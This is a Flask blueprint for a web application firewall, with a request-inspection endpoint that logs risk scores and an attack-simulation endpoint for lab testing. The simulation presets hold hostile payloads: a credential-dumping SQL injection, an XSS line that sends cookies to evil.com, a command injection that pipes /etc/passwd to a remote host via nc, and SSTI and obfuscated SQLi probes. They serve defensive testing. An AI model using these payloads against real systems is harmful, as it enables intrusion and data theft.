import json
from flask import Blueprint, request, jsonify
from app.database import db
from app.models import RequestLog, AttackTimelineEvent

waf_bp = Blueprint('waf_bp', __name__)

# Global singleton WAF inspector reference attached by app Factory
_waf_inspector = None

def get_waf_inspector():
    global _waf_inspector
    if _waf_inspector is None:
        from app.waf_engine.inspector import WAFInspector
        _waf_inspector = WAFInspector()
    return _waf_inspector

@waf_bp.route('/inspect', methods=['POST'])
def inspect_traffic():
    """
    Core WAF Inspection Endpoint.
    Inspects incoming HTTP request, calculates AMRSF 6-layer risk score,
    records audit log & attack timeline, and returns full SHAP explainable attribution.
    """
    data = request.get_json(silent=True) or {}
    ip_address = data.get('ip_address', request.remote_addr or '127.0.0.1')
    method = data.get('method', 'GET').upper()
    url = data.get('url', '/')
    headers = data.get('headers', {'User-Agent': request.headers.get('User-Agent', 'Unknown')})
    payload = data.get('payload', '')

    inspector = get_waf_inspector()
    result = inspector.inspect_request(ip_address, method, url, headers, payload)

    # Persist RequestLog in database
    log_entry = RequestLog(
        ip_address=ip_address,
        method=method,
        url=url,
        headers_json=json.dumps(headers),
        payload=payload,
        final_risk_score=result["final_risk_score"],
        signature_score=result["scores_breakdown"]["signature_score"],
        encoding_suspicion=result["scores_breakdown"]["encoding_suspicion"],
        payload_complexity=result["scores_breakdown"]["payload_complexity"],
        ml_confidence=result["scores_breakdown"]["ml_confidence"],
        behavioral_score=result["scores_breakdown"]["behavioral_score"],
        threat_intel_score=result["scores_breakdown"]["threat_intel_score"],
        decision=result["decision"],
        attack_category=result["attack_category"],
        reason=result["reason"],
        shap_explanations=json.dumps(result.get("shap_explanations", [])),
        action_taken=result["action_taken"]
    )
    db.session.add(log_entry)

    # Record AttackTimelineEvent if risk > 25
    if result["final_risk_score"] > 25.0:
        stage = "Reconnaissance"
        if result["decision"] == "Block":
            stage = "Automated Block / Quarantine"
        elif result["final_risk_score"] > 50.0:
            stage = "Exploit Probing Attempt"

        timeline_event = AttackTimelineEvent(
            campaign_id=f"CAMP-{ip_address.replace('.', '')[:8]}",
            ip_address=ip_address,
            stage=stage,
            attack_category=result["attack_category"],
            description=result["reason"],
            risk_score=result["final_risk_score"],
            decision=result["decision"]
        )
        db.session.add(timeline_event)

    db.session.commit()

    return jsonify({
        "status": "success",
        "inspection_result": result,
        "log_id": log_entry.id
    }), 200

@waf_bp.route('/simulate', methods=['POST'])
def simulate_attack():
    """
    Simulates preset or custom attack vectors for SOC Laboratory evaluation.
    """
    data = request.get_json(silent=True) or {}
    vector_type = data.get('attack_type', 'SQL Injection')

    presets = {
        "SQL Injection": {
            "url": "/api/v1/products?id=105' UNION SELECT 1,username,password FROM admin--",
            "payload": "",
            "method": "GET"
        },
        "XSS": {
            "url": "/comment/create",
            "payload": "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
            "method": "POST"
        },
        "Command Injection": {
            "url": "/sys/ping?target=127.0.0.1; cat /etc/passwd | nc 198.51.100.4 4444",
            "payload": "",
            "method": "GET"
        },
        "SSTI": {
            "url": "/profile/view",
            "payload": "user={{''.__class__.__mro__[1].__subclasses__()}}",
            "method": "POST"
        },
        "Obfuscated SQLi": {
            "url": "/search?q=1/*!50000UNION*/+/*!50000SELECT*/+1,@@version--",
            "payload": "",
            "method": "GET"
        },
        "Legitimate Traffic": {
            "url": "/home/products?category=wireless_headphones&page=1",
            "payload": "",
            "method": "GET"
        }
    }

    selected = presets.get(vector_type, presets["SQL Injection"])
    req_body = {
        "ip_address": data.get("ip_address", "198.51.100.24"),
        "method": selected["method"],
        "url": selected["url"],
        "headers": {"User-Agent": "Mozilla/5.0 SOC Lab Simulator"},
        "payload": selected["payload"]
    }

    # Internal inspection dispatch
    inspector = get_waf_inspector()
    result = inspector.inspect_request(
        req_body["ip_address"], req_body["method"], req_body["url"],
        req_body["headers"], req_body["payload"]
    )

    return jsonify({
        "simulated_vector": vector_type,
        "request_input": req_body,
        "inspection_result": result
    }), 200
